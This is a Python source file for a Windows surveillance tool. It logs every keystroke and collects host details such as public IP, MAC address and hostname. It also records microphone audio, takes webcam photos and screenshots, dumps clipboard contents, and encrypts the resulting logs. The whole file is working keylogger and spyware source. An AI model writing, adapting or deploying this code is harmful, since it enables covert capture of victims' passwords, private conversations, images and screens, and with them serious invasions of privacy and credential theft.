############################################################# IMPORT STATEMENTS #############################################################

import logging
import requests
import threading
import pyaudio
import win32clipboard
import time
import platform
import socket
import re
import uuid
import psutil
import os
import cv2
import pathlib
import sounddevice
import wavio


from pynput import keyboard, mouse
from pynput.keyboard import Key
from cryptography.fernet import Fernet
from PIL import ImageGrab
from scipy.io.wavfile import write as write_rec



############################################################# INITIALIZATION #############################################################

# Constants
SCREEN = 'Screenshots'
WEBCAM= 'WebcamPics'
LOG_FILE = "keylogfile.txt"
CLIPBOARD = "clipboard.txt"
WAVE_OUTPUT_FILENAME = "audiofolder\\"
ZIP = "test.zip"
CHUNK = 4096
FORMAT = pyaudio.paInt32
CHANNELS = 2
RATE = 48000


#Initialize PyAudio
audio = pyaudio.PyAudio()


############################################################# RETRIEVE INFORMATION #############################################################

#Setup logs files
def setup_logging():
    logging.basicConfig(filename=LOG_FILE, level=logging.DEBUG, format="%(asctime)s - %(message)s", datefmt="%Y-%m-%d %H:%M:%S", filemode='a')


#Get system information
def get_system_info():
    info = {}
    try:
        response = requests.get('https://ipinfo.io/ip')
        info['Public IP Address'] = response.text.strip()
    except requests.RequestException as e:
        info['Public IP Address'] = f"Unable to get the Public IP Address: {str(e)}"
    
    info['System'] = f"{platform.system()} {platform.version()}"
    info['Architecture'] = platform.machine()
    info['Hostname'] = socket.gethostname()
    info['Private IP Address'] = socket.gethostbyname(socket.gethostname())
    info['MAC Address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
    info['Processor'] = platform.processor()
    info['RAM'] = f"{str(round(psutil.virtual_memory().total / (1024.0 **3)))} GB"

    return info

# Log system information
def log_system_info():
    info = get_system_info()
    for key, value in info.items():
        logging.info(f"{key}: {value}")
    logging.info("LOGS : \n[Date Hour - 'Key' or 'Mouse Action']:")


# Handler for key press event
def on_press(key):
    logging.info(f"[Key Pressed] - {key}")


# Audio Recording
# Loop that save a picture every 5 seconds
def Audio():
    pathlib.Path(WAVE_OUTPUT_FILENAME).mkdir(parents=True, exist_ok=True)
    
    fs = 44100  # Sampling frequency (samples per second)
    seconds = 60  # Duration of the audio recording
    
    for x in range(20):
        recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait()  # Wait for the recording to finish
        output_filename = f'{WAVE_OUTPUT_FILENAME}/mic_recording_{x}.wav'
        wavio.write(output_filename, recording, fs, sampwidth=3)


# Capture images from webcam
def webcam():
    try:
        pathlib.Path(WEBCAM).mkdir(parents=True, exist_ok=True)
        cam_path = 'WebcamPics\\'
        cam = cv2.VideoCapture(0)
        for x in range(20):
            ret, img = cam.read()
            file = (cam_path + '{}.jpg'.format(x))
            cv2.imwrite(file, img)
            time.sleep(10)

        cam.release()  # Properly release the camera
        cv2.destroyAllWindows()  # Close OpenCV windows

    except Exception as e:
        print("WebcamPics could not be saved: " + str(e))


# Monitor clipboard
def clipboard():
    previous_clipboard_data = ""  # Store the previous clipboard content
    
    try:
        win32clipboard.OpenClipboard()
        pasted_data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()

        # Check if clipboard content has changed
        if pasted_data != previous_clipboard_data:
            with open(CLIPBOARD, "a") as file:
                file.write("Clipboard Data : \n")
                file.write(str(pasted_data) + "\n")
                file.write("\n")
            previous_clipboard_data = pasted_data

            # Add a small delay to avoid high CPU usage
            time.sleep(1)

    except Exception as e:
        with open(CLIPBOARD, "a") as file:
            file.write("\n Clipboard could not be copied: " + str(e) + "\n")


# Screenshot
def screenshot():
    try:
        pathlib.Path(SCREEN).mkdir(parents=True, exist_ok=True)
        screen_path = 'Screenshots\\'

        for x in range(0,10):
            pic = ImageGrab.grab()
            pic.save(screen_path + 'screenshot{}.png'.format(x))
            time.sleep(5)

    except Exception as e:
        print("Screenshots could not be saved: " + str(e))

def encrypt():
        files = [LOG_FILE, CLIPBOARD]

        with open('keyfile.key', 'rb') as keyfile:
            key = keyfile.read()

        for file in files:
            with open(file, 'rb') as plain_text:
                data = plain_text.read()
            encrypted = Fernet(key).encrypt(data)

            with open('e_' + file, 'ab') as hidden_data:    # Appending to the end of the file if it exists
                hidden_data.write(encrypted)


# Main functionv 
def main():
    try:
        # Log system information
        setup_logging()
        log_system_info()
        
        # Création des threads
        t1 = threading.Thread(target=clipboard)
        t2 = threading.Thread(target=webcam)
        t3 = threading.Thread(target=Audio)
        t4 = threading.Thread(target=screenshot)
        t5= threading.Thread(target=encrypt)

        t1.start()
        t2.start()
        t3.start()
        t4.start()
        t5.start()

        # Start the keyboard listener to log key presses
        with keyboard.Listener(on_press=on_press) as key_listener:
            key_listener.join()

        t1.join()
        t2.join()
        t3.join()
        t4.join()
        t5.join()

     

    except Exception as e:
        print(f"An error occurred: {str(e)}")


if __name__ == '__main__':
    try:
        if os.path.exists("keyfile.key"):
            main()
        else:
            print("You forgot to generate the Key x)")
    except KeyboardInterrupt:
        print("Control-C entered... Program exiting")
    except Exception as e:
        logging.exception(f"An error occurred: {str(e)}")
 